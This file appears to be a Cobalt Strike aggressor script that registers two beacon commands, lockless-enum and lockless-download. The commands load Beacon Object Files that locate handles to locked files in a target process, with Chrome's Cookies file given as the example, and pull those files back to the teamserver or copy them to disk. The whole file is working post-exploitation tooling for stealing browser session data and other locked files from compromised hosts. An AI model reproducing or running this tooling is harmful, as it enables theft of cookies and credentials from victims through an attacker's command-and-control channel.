beacon_command_register(
"lockless-download",
"Download locked file. A handle to the locked file can be identified with lockless-enum with the appropiate information",
"Usage: lockless-download <pid> <key> <value> <optional>
Example: \
   lockless-download 789 filename Cookies 
   lockless-download 789 handle_id 696
   lockless-download 789 handle_id /copy C:\Users\<user>\AppData\Local\cookies123.tmp
lockless-download Options: \
    <pid> -     	(Required): Process ID (PID) of the target application, queried for handles to desired locked file
    <key> -     	(Required): This can either be 'filename' or 'handle_id'
    <value> -   	(Required): If 'filename' is chosen, provide the full name of the file to be downloaded. The filename is case sensitive
                            If 'handle_id' is chosen, provide the handle ID to the locked file to be downloaded
    /copy -      	(optional): If the /copy switch is included, the file will be copied to disk. If not included, the file will filelessly be download to the cobalt strike teamserver. 
    <outputFile> - 	(optional): Full output path of file (ex: C:\Users\<user>\AppData\Local\cookies123.tmp)
    ");


beacon_command_register(
"lockless-enum",
"Locate file handle. Returns the 'pid' and 'handle_id' for a handle to the locked file (If identified)",
"Usage: lockless-enum <filename> <processname>
Example: \
   lockless-enum Cookies 
   lockless-enum Cookies Chrome
lockless- Enum Options: \
    <filename> -    (Required): The locked file's name.
    <processname> - (Optional): Narrow handle enumeration to the specified process. A partial name match is allowed (e.g., 'chro' for 'chrome')
    ");

# $1 - beacon id
# $2 - args

alias lockless-download {
    local('$handle $data $args $pid $key $value $copy $outputFile');

    # read in our BOF file...   
    $handle = openf(script_resource("LocklessDownload.x64.o"));
    $data   = readb($handle, -1);
    closef($handle);

    if(strlen($data) == 0)
    {
        berror($1, "could not read bof file");
        return;
    }

    if(size(@_) < 4)
    {
        berror($1, "missing argument");
        return;
    }
    $pid = @_[1];
    $key = @_[2];
    $value = @_[3];
    $copy = @_[4];
    $outputFile = @_[5];

    if(!-isnumber $pid || $pid eq "1")
    {
        berror($1, "Invalid PID: ");
        return;
    }

	if ($copy eq "/copy")
	{
		$copy = 1;

	}
	else{
		$copy = 0;
	}
    if ($key eq "filename")
    {
    	$args = bof_pack($1, "iZZiZ", $pid, $key, $value, $copy, $outputFile);
        beacon_inline_execute($1, $data, "go", $args);

    }else if ($key eq "handle_id"){
        if(!-isnumber $value){
            berror($1, "Error: Invalid file handle value:" .$value);
            return;
        }
        $args = bof_pack($1, "iZiiZ", $pid, $key, $value, $copy, $outputFile);
        beacon_inline_execute($1, $data, "go", $args);

    }
    else{

        berror($1, "Error: Invalid key value:" .$key);
    }

}

alias lockless-enum {
    local('$handle $data $args $filename $processName');

    # read in our BOF file...   
    $handle = openf(script_resource("LocklessEnum.x64.o"));
    $data   = readb($handle, -1);
    closef($handle);

    if(strlen($data) == 0)
    {
        berror($1, "could not read bof file");
        return;
    }

    if(size(@_) == 1)
    {
        berror($1, "missing argument");
        return;
    }
    $filename = @_[1];

    if(size(@_) == 3)
    {
        $processName = @_[2];
    }
    if(size(@_) > 3){
        berror($1, "Too many Arguments");
        return;
    }

    
    $args = bof_pack($1, "ZZ", $filename, $processName);
    beacon_inline_execute($1, $data, "go", $args);

}
